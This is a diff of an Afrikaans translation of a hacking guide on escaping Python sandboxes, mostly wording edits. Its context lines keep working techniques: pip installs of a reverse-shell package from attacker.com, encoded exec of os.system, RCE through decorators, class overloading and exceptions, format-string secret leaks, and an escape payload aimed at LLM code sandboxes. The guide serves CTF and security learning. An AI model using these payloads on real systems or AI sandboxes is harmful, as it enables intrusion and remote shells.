@@ -41,9 +41,9 @@ system('ls')
 ```
 Onthou dat die _**open**_ en _**read**_ funksies nuttig kan wees om **lêers** binne die python sandbox te **lees** en om **kode** te **skryf** wat jy kan **uitvoer** om die sandbox te **omseil**.
 
-> [!CAUTION] > **Python2 input()** funksie laat toe dat python kode uitgevoer word voordat die program ineenstort.
+> [!CAUTION] > **Python2 input()** funksie laat toe om python kode uit te voer voordat die program ineenstort.
 
-Python probeer om **biblioteke van die huidige gids eerste** te **laai** (die volgende opdrag sal wys waar python modules laai): `python3 -c 'import sys; print(sys.path)'`
+Python probeer om **biblioteke van die huidige gids eerste** te **laai** (die volgende opdrag sal wys waar python modules laai vanaf): `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../images/image (559).png>)
 
@@ -52,7 +52,7 @@ Python probeer om **biblioteke van die huidige gids eerste** te **laai** (die vo
 ### Standaard pakkette
 
 Jy kan 'n **lys van vooraf geïnstalleerde** pakkette hier vind: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-Let daarop dat jy vanaf 'n pickle die python omgewing kan **importeer arbitrêre biblioteke** wat in die stelsel geïnstalleer is.\
+Let daarop dat jy van 'n pickle die python omgewing kan **importeer arbitrêre biblioteke** wat in die stelsel geïnstalleer is.\
 Byvoorbeeld, die volgende pickle, wanneer dit gelaai word, gaan die pip biblioteek importeer om dit te gebruik:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
@@ -72,24 +72,24 @@ Vir meer inligting oor hoe pickle werk, kyk hier: [https://checkoway.net/musings
 
 Truk gedeel deur **@isHaacK**
 
-As jy toegang het tot `pip` of `pip.main()` kan jy 'n arbitrêre pakket installeer en 'n omgekeerde shell verkry deur te bel:
+As jy toegang het tot `pip` of `pip.main()`, kan jy 'n arbitrêre pakket installeer en 'n omgekeerde shell verkry deur te bel:
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-U kan die pakket aflaai om die omgekeerde skulp hier te skep. Let asseblief daarop dat u dit moet **dekomprimeer, die `setup.py` moet verander, en u IP vir die omgekeerde skulp moet invoer**:
+U kan die pakket aflaai om die omgekeerde skulp hier te skep. Let asseblief daarop dat u dit moet **dekomprimeer, die `setup.py` moet verander, en u IP vir die omgekeerde skulp moet plaas**:
 
 {{#file}}
 Reverse.tar (1).gz
 {{#endfile}}
 
-> [!NOTE]
-> Hierdie pakket word `Reverse` genoem. Dit is egter spesiaal ontwerp sodat wanneer u die omgekeerde skulp verlaat, die res van die installasie sal misluk, sodat u **nie enige ekstra python pakket op die bediener sal agterlaat** wanneer u vertrek nie.
+> [!TIP]
+> Hierdie pakket word `Reverse` genoem. Dit is egter spesiaal gemaak sodat wanneer u die omgekeerde skulp verlaat, die res van die installasie sal misluk, sodat u **nie enige ekstra python pakket op die bediener sal agterlaat** wanneer u vertrek nie.
 
 ## Eval-ing python kode
 
 > [!WARNING]
-> Let daarop dat exec meerlyn strings en ";", maar eval nie toelaat nie (kyk walrus operator)
+> Let daarop dat exec meerlyn strings en ";", toelaat, maar eval nie (kyk walrus operator)
 
 As sekere karakters verbode is, kan u die **hex/octal/B64** voorstelling gebruik om die beperking te **bypass**:
 ```python
@@ -112,7 +112,7 @@ exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x
 exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
-### Ander biblioteke wat toelaat om python kode te evaluer
+### Ander biblioteke wat toelaat om python kode te evaluer.
 ```python
 #Pandas
 import pandas as pd
@@ -152,7 +152,7 @@ Dit is ook moontlik om dit te omseil met ander kodering, bv. `raw_unicode_escape
 
 ## Python uitvoering sonder oproepe
 
-As jy binne 'n python tronk is wat **nie toelaat dat jy oproepe maak nie**, is daar steeds 'n paar maniere om **arbitraire funksies, kode** en **opdragte** te **uitvoer**.
+As jy binne 'n python tronk is wat **nie toelaat dat jy oproepe maak nie**, is daar steeds 'n paar maniere om **arbitraire funksies, kode** en **opdragte** uit te voer.
 
 ### RCE met [decorators](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
@@ -178,11 +178,11 @@ class _:pass
 ```
 ### RCE die skep van voorwerpe en oorlaai
 
-As jy 'n **klas kan verklaar** en 'n **voorwerp van daardie klas kan skep**, kan jy **verskillende metodes skryf/oorlaai** wat **geaktiveer** kan word **sonder** om hulle direk te noem.
+As jy 'n **klas kan verklaar** en 'n **voorwerp van daardie klas kan skep**, kan jy **verskillende metodes skryf/oorlaai** wat **geaktiveer** kan word **sonder** om hulle **direk aan te roep**.
 
 #### RCE met pasgemaakte klasse
 
-Jy kan sommige **klasmetodes** (_deur bestaande klasmetodes te oorlaai of 'n nuwe klas te skep_) wysig om hulle **arbitraire kode** te laat **uitvoer** wanneer hulle **geaktiveer** word sonder om hulle direk te noem.
+Jy kan sommige **klasmetodes** (_deur bestaande klasmetodes te oorlaai of 'n nuwe klas te skep_) aanpas om hulle **arbitraire kode** te laat **uitvoer** wanneer hulle **geaktiveer** word sonder om hulle direk aan te roep.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -249,9 +249,9 @@ Sub['import os; os.system("sh")']
 
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
-#### Skep voorwerpe met uitsonderings
+#### Skep objek met uitsonderings
 
-Wanneer 'n **uitsondering geaktiveer** word, word 'n voorwerp van die **Uitsondering** **gecreëer** sonder dat jy die konstruktors direk hoef aan te roep (n truuk van [**@\_nag0mez**](https://mobile.twitter.com/_nag0mez)):
+Wanneer 'n **uitsondering geaktiveer word** word 'n objek van die **Uitsondering** **gecreëer** sonder dat jy die konstruktors direk hoef aan te roep (n truuk van [**@\_nag0mez**](https://mobile.twitter.com/_nag0mez)):
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -315,9 +315,9 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ### Geen Builtins
 
 Wanneer jy nie `__builtins__` het nie, gaan jy nie in staat wees om enigiets te importeer of selfs lêers te lees of te skryf nie, aangesien **alle globale funksies** (soos `open`, `import`, `print`...) **nie gelaai is nie**.\
-E however, **standaard importeer python 'n baie modules in geheue**. Hierdie modules mag onskuldig voorkom, maar sommige van hulle **importeer ook gevaarlike** funksies binne-in hulle wat toegang verkry kan word om selfs **arbitraire kode-uitvoering** te verkry.
+E however, **standaard laai python baie modules in geheue**. Hierdie modules mag onskuldig voorkom, maar sommige van hulle **laai ook gevaarlike** funksies binne hulle wat toegang kan gee tot **arbitêre kode-uitvoering**.
 
-In die volgende voorbeelde kan jy sien hoe om **misbruik** te maak van sommige van hierdie "**onskuldige**" modules wat gelaai is om **toegang** te verkry tot **gevaarlike** **funksies** binne-in hulle.
+In die volgende voorbeelde kan jy sien hoe om sommige van hierdie "**onskuldige**" modules te **misbruik** wat gelaai is om **toegang** te verkry tot **gevaarlike** **funksies** binne hulle.
 
 **Python2**
 ```python
@@ -377,7 +377,7 @@ __builtins__["__import__"]("os").system("ls")
 ```
 ## Globals en locals
 
-Om die **`globals`** en **`locals`** te kontroleer is 'n goeie manier om te weet wat jy kan toegang.
+Om die **`globals`** en **`locals`** te kontroleer, is 'n goeie manier om te weet wat jy kan toegang.
 ```python
 >>> globals()
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
@@ -439,7 +439,7 @@ defined_func.__class__.__base__.__subclasses__()
 ```
 ### Vind gevaarlike biblioteke wat gelaai is
 
-Byvoorbeeld, as jy weet dat dit met die biblioteek **`sys`** moontlik is om **arbitraire biblioteke te importeer**, kan jy soek na al die **modules wat gelaai is wat sys binne-in hulle geïmporteer het**:
+Byvoorbeeld, om te weet dat dit met die biblioteek **`sys`** moontlik is om **arbitraire biblioteke te importeer**, kan jy soek na al die **modules wat gelaai is wat sys binne hulle geïmporteer het**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
@@ -662,7 +662,7 @@ https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-
 
 ## Python Formaat String
 
-As jy 'n **string** na python **stuur** wat geformateer gaan word, kan jy `{}` gebruik om toegang te verkry tot **python interne inligting.** Jy kan die vorige voorbeelde gebruik om toegang te verkry tot globals of builtins byvoorbeeld.
+As jy 'n **string** na python **stuur** wat ge **formateer** gaan word, kan jy `{}` gebruik om toegang te verkry tot **python interne inligting.** Jy kan die vorige voorbeelde gebruik om toegang te verkry tot globals of builtins byvoorbeeld.
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -682,11 +682,11 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Let op hoe jy **toegang kan verkry tot eienskappe** op 'n normale manier met 'n **punt** soos `people_obj.__init__` en **dict element** met **haakies** sonder aanhalings `__globals__[CONFIG]`
+Let op hoe jy **kenmerke** op 'n normale manier met 'n **punt** kan toegang verkry soos `people_obj.__init__` en **dict element** met **haakies** sonder aanhalings `__globals__[CONFIG]`
 
 Neem ook kennis dat jy `.__dict__` kan gebruik om elemente van 'n objek op te som `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-Sommige ander interessante eienskappe van formaat stringe is die moontlikheid om **funksies** **`str`**, **`repr`** en **`ascii`** in die aangeduide objek uit te voer deur **`!s`**, **`!r`**, **`!a`** onderskeidelik by te voeg:
+Sommige ander interessante eienskappe van formaat stringe is die moontlikheid om die **funksies** **`str`**, **`repr`** en **`ascii`** in die aangeduide objek uit te voer deur **`!s`**, **`!r`**, **`!a`** onderskeidelik by te voeg:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
@@ -705,7 +705,8 @@ return 'HAL 9000'
 **Meer voorbeelde** oor **formaat** **string** voorbeelde kan gevind word in [**https://pyformat.info/**](https://pyformat.info)
 
 > [!WAARSKUWING]
-> Kyk ook na die volgende bladsy vir gadgets wat r**ead sensitiewe inligting uit Python interne voorwerpe**:
+> Kyk ook na die volgende bladsy vir gadgets wat r**eeds sensitiewe inligting uit Python interne voorwerpe**:
+
 
 {{#ref}}
 ../python-internal-read-gadgets.md
@@ -727,20 +728,20 @@ secret_variable = "clueless"
 x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
 str(x) # Out: clueless
 ```
-### LLM Jails omseiling
+### LLM Jails omseil
 
-Van [hier](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
+From [here](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
 
 ### Van formaat na RCE laai biblioteke
 
 Volgens die [**TypeMonkey uitdagings van hierdie skrywe**](https://corgi.rip/posts/buckeye-writeups/) is dit moontlik om arbitrêre biblioteke vanaf skyf te laai deur die formaat string kwesbaarheid in python te misbruik.
 
-As herinnering, elke keer as 'n aksie in python uitgevoer word, word 'n funksie uitgevoer. Byvoorbeeld `2*3` sal **`(2).mul(3)`** of **`{'a':'b'}['a']`** sal **`{'a':'b'}.__getitem__('a')`** wees.
+As herinnering, elke keer wanneer 'n aksie in python uitgevoer word, word 'n funksie uitgevoer. Byvoorbeeld `2*3` sal **`(2).mul(3)`** of **`{'a':'b'}['a']`** sal **`{'a':'b'}.__getitem__('a')`** wees.
 
-Jy kan meer hiervan vind in die afdeling [**Python uitvoering sonder oproepe**](#python-execution-without-calls).
+Jy kan meer hiervan in die afdeling [**Python uitvoering sonder oproepe**](#python-execution-without-calls) vind.
 
 'n Python formaat string kwesbaarheid laat nie toe om 'n funksie uit te voer (dit laat nie toe om haakies te gebruik nie), so dit is nie moontlik om RCE te kry soos `'{0.system("/bin/sh")}'.format(os)`.\
-Tog, dit is moontlik om `[]` te gebruik. Daarom, as 'n algemene python biblioteek 'n **`__getitem__`** of **`__getattr__`** metode het wat arbitrêre kode uitvoer, is dit moontlik om dit te misbruik om RCE te verkry.
+Tog, dit is moontlik om `[]` te gebruik. Daarom, as 'n algemene python biblioteek 'n **`__getitem__`** of **`__getattr__`** metode het wat arbitrêre kode uitvoer, is dit moontlik om dit te misbruik om RCE te kry.
 
 Soek na 'n gadget soos dit in python, die skrywe stel hierdie [**Github soeknavraag**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code) voor. Waar hy hierdie [een](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463) gevind het:
 ```python
@@ -772,7 +773,7 @@ Die uitdaging misbruik eintlik 'n ander kwesbaarheid in die bediener wat toelaat
 
 ## Ontleding van Python-objekte
 
-> [!NOTE]
+> [!TIP]
 > As jy wil **leer** oor **python bytecode** in diepte, lees hierdie **wonderlike** pos oor die onderwerp: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
 In sommige CTFs kan jy voorsien word van die naam van 'n **aangepaste funksie waar die vlag** geleë is en jy moet die **binne werking** van die **funksie** ondersoek om dit te onttrek.
@@ -898,7 +899,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Let wel dat **as jy nie `dis` in die python sandbox kan invoer nie**, kan jy die **bytecode** van die funksie (`get_flag.func_code.co_code`) verkry en dit lokaal **ontbind**. Jy sal nie die inhoud van die veranderlikes wat gelaai word (`LOAD_CONST`) sien nie, maar jy kan dit raai vanaf (`get_flag.func_code.co_consts`) omdat `LOAD_CONST` ook die offset van die veranderlike wat gelaai word, aandui.
+Let wel dat **as jy nie `dis` in die python sandbox kan invoer nie**, kan jy die **bytecode** van die funksie (`get_flag.func_code.co_code`) verkry en dit plaaslik **ontbind**. Jy sal nie die inhoud van die veranderlikes wat gelaai word (`LOAD_CONST`) sien nie, maar jy kan dit raai vanaf (`get_flag.func_code.co_consts`) omdat `LOAD_CONST` ook die offset van die veranderlike wat gelaai word, aandui.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -920,7 +921,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 44 LOAD_CONST          0 (0)
 47 RETURN_VALUE
 ```
-## Compiling Python
+## Samevoeg van Python
 
 Nou, laat ons voorstel dat jy op een of ander manier **die inligting oor 'n funksie wat jy nie kan uitvoer nie** kan **dump** maar jy **moet** dit **uitvoer**.\
 Soos in die volgende voorbeeld, jy **kan toegang kry tot die kode objek** van daardie funksie, maar net deur die disassemble te lees, **weet jy nie hoe om die vlag te bereken nie** (_verbeel jou 'n meer komplekse `calc_flag` funksie_)
@@ -938,7 +939,7 @@ return "Nope"
 ```
 ### Die kode objek te skep
 
-Eerstens, ons moet weet **hoe om 'n kode objek te skep en uit te voer** sodat ons een kan skep om ons funksie te voer wat gelek het:
+Eerstens, ons moet weet **hoe om 'n kode objek te skep en uit te voer** sodat ons een kan skep om ons funksie te voer:
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -957,13 +958,13 @@ mydict = {}
 mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
-> [!NOTE]
+> [!TIP]
 > Afhangende van die python weergawe kan die **parameters** van `code_type` 'n **ander volgorde** hê. Die beste manier om die volgorde van die params in die python weergawe wat jy gebruik, te weet, is om te loop:
 >
 > ```
 > import types
 > types.CodeType.__doc__
-> 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
+> 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nSkep 'n kode objek.  Nie vir die wat maklik skrik nie.'
 > ```
 
 ### Herstel van 'n gelekte funksie
@@ -985,7 +986,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 In vorige voorbeelde aan die begin van hierdie pos, kan jy **sien hoe om enige python kode uit te voer met die `compile` funksie**. Dit is interessant omdat jy **hele skripte** met lusse en alles in 'n **eenlyn** kan **uitvoer** (en ons kan dieselfde doen met **`exec`**).\
 In elk geval, soms kan dit nuttig wees om 'n **gecompileerde objek** op 'n plaaslike masjien te **skep** en dit in die **CTF masjien** uit te voer (byvoorbeeld omdat ons nie die `compiled` funksie in die CTF het nie).
 
-Vir voorbeeld, kom ons compileer en voer handmatig 'n funksie uit wat _./poc.py_ lees:
+Byvoorbeeld, kom ons compileer en voer handmatig 'n funksie uit wat _./poc.py_ lees:
 ```python
 #Locally
 def read():
@@ -1012,7 +1013,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-As jy nie toegang tot `eval` of `exec` kan kry nie, kan jy 'n **regte funksie** skep, maar om dit direk aan te roep, gaan gewoonlik misluk met: _constructor nie toeganklik in beperkte modus_. So jy het 'n **funksie buite die beperkte omgewing nodig om hierdie funksie aan te roep.**
+As jy nie toegang tot `eval` of `exec` kan kry nie, kan jy 'n **regte funksie** skep, maar om dit direk aan te roep, gaan gewoonlik misluk met: _konstruktors nie toeganklik in beperkte modus_. Jy het 'n **funksie buite die beperkte omgewing nodig om hierdie funksie aan te roep.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1022,9 +1023,10 @@ f(42)
 ```
 ## Decompiling Compiled Python
 
-Met die gebruik van gereedskap soos [**https://www.decompiler.com/**](https://www.decompiler.com) kan 'n mens gecompileerde python kode **decompile**.
+Met die gebruik van gereedskap soos [**https://www.decompiler.com/**](https://www.decompiler.com) kan 'n mens gegewe gecompileerde python kode **decompile**.
 
 **Kyk na hierdie tutoriaal**:
+
 
 {{#ref}}
 ../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md
@@ -1034,7 +1036,7 @@ Met die gebruik van gereedskap soos [**https://www.decompiler.com/**](https://ww
 
 ### Assert
 
-Python wat met optimalisering uitgevoer word met die param `-O` sal assert stellings en enige kode wat voorwaardelik op die waarde van **debug** is, verwyder.\
+Python wat met optimalisering uitgevoer word met die parameter `-O` sal assert stellings en enige kode wat voorwaardelik op die waarde van **debug** is, verwyder.\
 Daarom, kontroles soos
 ```python
 def check_permission(super_user):
